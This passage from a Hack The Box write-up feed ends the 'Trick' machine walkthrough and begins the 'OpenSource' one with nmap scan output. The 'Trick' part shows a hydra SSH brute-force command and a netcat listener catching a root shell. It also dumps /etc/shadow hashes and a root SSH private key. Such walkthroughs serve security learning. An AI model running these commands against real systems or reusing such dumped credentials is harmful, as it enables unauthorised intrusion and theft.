<span id="cb10-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">michael@trick:/etc/fail2ban$</span> sudo /etc/init.d/fail2ban restart</span>
<span id="cb10-5"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">[</span> ok <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">]</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Restarting</span> fail2ban <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">via</span> systemctl<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span> fail2ban.service.</span></code></pre></div>
<div class="sourceCode" id="cb11" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb11-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  trick hydra <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-l</span> michael <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-P</span> /usr/share/wordlists/rockyou.txt ssh://10.129.37.48 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-vV</span></span></code></pre></div>
<div class="sourceCode" id="cb12" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb12-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  trick nc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-lvnp</span> 4488</span>
<span id="cb12-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">listening</span> on <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">any</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> 4488 ...</span>
<span id="cb12-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">connect</span> to <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">10.10.15.1</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> from <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UNKNOWN</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[10.129.37.48]</span> 38994</span>
<span id="cb12-4"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">id</span> </span>
<span id="cb12-5"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb12-6"></span>
<span id="cb12-7"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cat</span> /root/root.txt</span>
<span id="cb12-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">395ca4e650fa0df53f1428253feb8b57</span></span>
<span id="cb12-9"></span>
<span id="cb12-10"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cat</span> /etc/shadow</span>
<span id="cb12-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$6$lbBzS2rUUVRa6Erd$u2u317eVZBZgdCrT2HViYv</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">.69vxazyKjAuVETHTpTpD42H0RDPQIbsCHwPdKqBQphI/FOmpEt3lgD9QBsu6nU1:19104:0:99999:7:::</span></span>
<span id="cb12-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">michael:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$6$SPev7eFL5z0aKFf0$5</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">iLTl9egsGGePEPUnNJlFyw8HHvTwqVC3/THKzW2YD5ZPnbkN7pSOeOkXe9uiUHfOJegJdYT0j3Z9pz.FSX2y0:19104:0:99999:7:::</span></span>
<span id="cb12-13"></span>
<span id="cb12-14"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cat</span> /root/.ssh/id_rsa</span>
<span id="cb12-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-----BEGIN</span> OPENSSH PRIVATE KEY-----</span>
<span id="cb12-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span></span>
<span id="cb12-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">NhAAAAAwEAAQAAAQEAoSBXc6x1gauygp8zl8Y13QXTwj633MsMv/0YsBzmGiHb1xBadkGC</span></span>
<span id="cb12-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">6a0abDxM4UycoYN82sT7N732cJqL9mWK7ZeGPQX4+RHD0fQnVQY3KCYak7RxQQtilsErhG</span></span>
<span id="cb12-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">VgovwAtnbaKA+tlfsO7IlD3Mv6lbJ/ElD9drwhJOVdEf4IL+8SstVgd0AehVQgnLXd58MK</span></span>
<span id="cb12-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">7tuKX+a/+eBBjzfpA6hWIzTT3koLnMoTWe5uCuhIJiaBUQyvrBQ1C/M4E7rnHw6Rgh9x9d</span></span>
<span id="cb12-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1LPInu0NMxbw0LAuFaQRcz3ewzEt8M2d639vedwahK5MyuTQS/ZTt33yjoas40kv+NZ5Y0</span></span>
<span id="cb12-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">5vVeP6XxcwAAA8jXOo441zqOOAAAAAdzc2gtcnNhAAABAQChIFdzrHWBq7KCnzOXxjXdBd</span></span>
<span id="cb12-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PCPrfcywy//RiwHOYaIdvXEFp2QYLprRpsPEzhTJyhg3zaxPs3vfZwmov2ZYrtl4Y9Bfj5</span></span>
<span id="cb12-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">EcPR9CdVBjcoJhqTtHFBC2KWwSuEZWCi/AC2dtooD62V+w7siUPcy/qVsn8SUP12vCEk5V</span></span>
<span id="cb12-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0R/ggv7xKy1WB3QB6FVCCctd3nwwru24pf5r/54EGPN+kDqFYjNNPeSgucyhNZ7m4K6Egm</span></span>
<span id="cb12-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">JoFRDK+sFDUL8zgTuucfDpGCH3H13Us8ie7Q0zFvDQsC4VpBFzPd7DMS3wzZ3rf2953BqE</span></span>
<span id="cb12-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">rkzK5NBL9lO3ffKOhqzjSS/41nljTm9V4/pfFzAAAAAwEAAQAAAQEAkxF9ITUZ8GjywC1m</span></span>
<span id="cb12-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">HzOpOHu4JIWwtxSTJ65x2VYXZWTgT7Y6i9QSFQ6OnpqPpdmS4g2tadYAY4m9plw6QoW+wE</span></span>
<span id="cb12-29"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">zdF1gbP+RKM5pCSGYq9DeLbKR392HX9DiPawJJqZqRX/qt94EP9WS544cK7T82E2tgdyx7</span></span>
<span id="cb12-30"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">nePr8Mx2HhUcDfsbxQlRbM9oKqIBQ0v9GdBotvi+Ri/IQfpEpmS64cU450/DlrwQ358MU9</span></span>
<span id="cb12-31"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">i8so0KlnAHLYxgzhEzPjPehaRShcsRdhasw1/xVKk7PoBvXzz9r+Ywo5b2htiYzqxt5N5i</span></span>
<span id="cb12-32"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">E8UOrUeYb7G21QjuhKB9KerukyGeHdBPjqvYuYjTwf2dUQAAAIEAnSUxZdekVLY0IoYPBF</span></span>
<span id="cb12-33"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">DBDIMkk97Kq2v8H51L9Q0rKBs79x4ZaV56LfMnTxuAxwnUMUauyPeGZFDgVsFwg0JK+vbR</span></span>
<span id="cb12-34"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Kj9idBoMTOuDdfTE4IJtT3tEKClzFS9YSrYdQ78OUu8Kip3p5OuWfrzTuhRCKZ2cwd86WU</span></span>
<span id="cb12-35"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ghEBWtHhn/2RsAAACBANHocGFZWWM1DGtA3ZXiytuJLh7D55NUPk7jumm+qcF7UUiKaRHA</span></span>
<span id="cb12-36"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">QnQ44oxHssJbkGi4S3tvfSlXFtNboQCt3q5Wgc3wl4S+sBGoq1xsZuXAz/3QX2AjXSpN/S</span></span>
<span id="cb12-37"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PkO+h4pk25aAFjGmAMMoH1Ty9v2X8ahYRY5EV8Y/LRcMF32Z5rAAAAgQDEgb1hc85TS0Wz</span></span>
<span id="cb12-38"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">pmGTto+ok3eI/10wxgbZXtdki7Jn1npNI5S7lh0r76jqEn5edcIYlwcUV+b6dCucDUhUHl</span></span>
<span id="cb12-39"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">7VT/uoy+BKbanLzM809KCnuLCM7LDISk4N/S79xiuFlrk11MrV2qaxZANiYEkOd1jKRGPi</span></span>
<span id="cb12-40"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">UDRYRn2lPX7WiLyrGQAAAApyb290QHRyaWNrAQIDBAUGBw</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>=</span>
<span id="cb12-41"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-----END</span> OPENSSH PRIVATE KEY-----</span></code></pre></div>


</section>
</section>

 ]]></description>
  <category>hackthebox</category>
  <category>linux</category>
  <category>dns</category>
  <category>fuzzing</category>
  <category>sqli</category>
  <category>lfi</category>
  <category>fail2ban</category>
  <category>hydra</category>
  <guid>https://exploit.se/posts/2022-06-20-htb-writeup-trick/2022-06-20-htb-writeup-trick.html</guid>
  <pubDate>Mon, 20 Jun 2022 00:00:00 GMT</pubDate>
  <media:content url="https://exploit.se/posts/2022-06-20-htb-writeup-trick/images/trick_logo.png" medium="image" type="image/png" height="144" width="144"/>
</item>
<item>
  <title>OpenSource - Hack The Box</title>
  <dc:creator>0xPThree </dc:creator>
  <link>https://exploit.se/posts/2022-05-24-htb-writeup-opensource/2022-05-24-htb-writeup-opensource.html</link>
  <description><![CDATA[ 





<section id="user" class="level1">
<h1>USER</h1>
<section id="step-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1">Step 1</h3>
<p><strong>nmap:</strong></p>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  opensource nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p-</span> 10.129.69.218 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-v</span></span>
<span id="cb1-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>     STATE    SERVICE</span>
<span id="cb1-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">22/tcp</span>   open     ssh</span>
<span id="cb1-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80/tcp</span>   open     http</span>
<span id="cb1-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3000/tcp</span> filtered ppp</span>
<span id="cb1-6"></span>
<span id="cb1-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  opensource nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sCV</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p22,80,3000</span> 10.129.69.218</span>
<span id="cb1-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>     STATE    SERVICE VERSION</span>
<span id="cb1-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">22/tcp</span>   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span> Linux<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">protocol</span> 2.0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-10"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ssh-hostkey:</span> </span>
<span id="cb1-11"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2048</span> 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">RSA</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-12"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">256</span> 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ECDSA</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-13"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ED25519</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80/tcp</span>   open     http    Werkzeug/2.1.2 Python/3.10.3</span>
<span id="cb1-15"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">fingerprint-strings:</span> </span>
<span id="cb1-16"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">GetRequest:</span> </span>
<span id="cb1-17"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">HTTP/1.1</span> 200 OK</span>
<span id="cb1-18"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Server:</span> Werkzeug/2.1.2 Python/3.10.3</span>
<span id="cb1-19"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Date:</span> Mon, 23 May 2022 17:53:44 GMT</span>
<span id="cb1-20"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Content-Type:</span> text/html<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">charset</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>utf-8</span>
<span id="cb1-21"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Content-Length:</span> 5316</span>
<span id="cb1-22"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Connection:</span> close</span>
<span id="cb1-23"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>html <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">lang</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"en"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-24"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>head<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-25"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>meta <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">charset</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"UTF-8"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-26"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>meta <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">name</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"viewport"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">content</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"width=device-width, initial-scale=1.0"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-27"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>title<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>upcloud <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span> Upload files for Free!<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/title<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-28"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>script <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">src</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"/static/vendor/jquery/jquery-3.4.1.min.js"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&lt;</span>/script<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-29"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>script <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">src</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"/static/vendor/popper/popper.min.js"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&lt;</span>/script<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-30"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>script <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">src</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"/static/vendor/bootstrap/js/bootstrap.min.js"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&lt;</span>/script<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-31"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>script <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">src</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"/static/js/ie10-viewport-bug-workaround.js"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&lt;</span>/script<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-32"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>link <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">rel</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"stylesheet"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">href</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"/static/vendor/bootstrap/css/bootstrap.css"</span>/<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-33"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>link <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">rel</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"stylesheet"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">href</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">" /static/vendor/bootstrap/css/bootstrap-grid.css"</span>/<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-34"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>link <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">rel</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"stylesheet"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">href</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">" /static/vendor/bootstrap/css/bootstrap-reboot.css"</span>/<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-35"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>link <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">rel</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span></span>
<span id="cb1-36"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">HTTPOptions:</span> </span>
<span id="cb1-37"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">HTTP/1.1</span> 200 OK</span>
<span id="cb1-38"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Server:</span> Werkzeug/2.1.2 Python/3.10.3</span>
<span id="cb1-39"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Date:</span> Mon, 23 May 2022 17:53:44 GMT</span>
<span id="cb1-40"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Content-Type:</span> text/html<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">charset</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>utf-8</span>
<span id="cb1-41"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Allow:</span> GET, OPTIONS, HEAD</span>
<span id="cb1-42"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Content-Length:</span> 0</span>
<span id="cb1-43"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Connection:</span> close</span>
<span id="cb1-44"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">RTSPRequest:</span> </span>
<span id="cb1-45"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>!DOCTYPE <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">HTML</span> PUBLIC <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"-//W3C//DTD HTML 4.01//EN"</span></span>
<span id="cb1-46"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"http://www.w3.org/TR/html4/strict.dtd"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-47"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>html<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-48"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>head<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-49"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
